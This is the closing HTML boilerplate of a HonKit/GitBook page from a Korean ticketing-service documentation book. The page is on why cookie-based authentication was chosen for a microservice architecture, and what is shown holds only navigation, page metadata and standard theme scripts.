            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="seat-lock-structure.html" class="navigation navigation-prev " aria-label="Previous page: 좌석 락 시스템 가이드">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../11-infra/CICD.html" class="navigation navigation-next " aria-label="Next page: CICD">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"MSA 환경에서 쿠키 기반 인증을 선택한 이유","level":"7.8","depth":1,"next":{"title":"CICD","level":"8.1","depth":1,"path":"11-infra/CICD.md","ref":"11-infra/CICD.md","articles":[]},"previous":{"title":"좌석 락 시스템 가이드","level":"7.7","depth":1,"path":"07-backend/seat-lock-structure.md","ref":"07-backend/seat-lock-structure.md","articles":[]},"dir":"ltr"},"config":{"plugins":["mermaid-gb3"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"mermaid-gb3":{"theme":"default"},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"공연 티켓팅 서비스 GitBook","gitbook":"*"},"file":{"path":"07-backend/why-cookie-based-auth.md","mtime":"2025-10-14T05:09:03.453Z","type":"markdown"},"gitbook":{"version":"6.0.3","time":"2025-10-14T05:09:15.772Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    
    <noscript>
        <style>
            .honkit-cloak {
                display: block !important;
            }
        </style>
    </noscript>
    <script>
        // Restore sidebar state as critical path for prevent layout shift
        function __init__getSidebarState(defaultValue){
            var baseKey = "";
            var key = baseKey + ":sidebar";
            try {
                var value = localStorage[key];
                if (value === undefined) {
                    return defaultValue;
                }
                var parsed = JSON.parse(value);
                return parsed == null ? defaultValue : parsed;
            } catch (e) {
                return defaultValue;
            }
        }
        function __init__restoreLastSidebarState() {
            var isMobile = window.matchMedia("(max-width: 600px)").matches;
            if (isMobile) {
                // Init last state if not mobile
                return;
            }
            var sidebarState = __init__getSidebarState(true);
            var book = document.querySelector(".book");
            // Show sidebar if it enabled
            if (sidebarState && book) {
                book.classList.add("without-animation", "with-summary");
            }
        }

        try {
            __init__restoreLastSidebarState();
        } finally {
            var book = document.querySelector(".book");
            book.classList.remove("honkit-cloak");
        }
    </script>
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-mermaid-gb3/book/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/@honkit/honkit-plugin-fontsettings/fontsettings.js"></script>
        
    

    <script src="../gitbook/gitbook-plugin-mermaid-gb3/mermaid/mermaid.min.js"></script>

    </body>
</html>

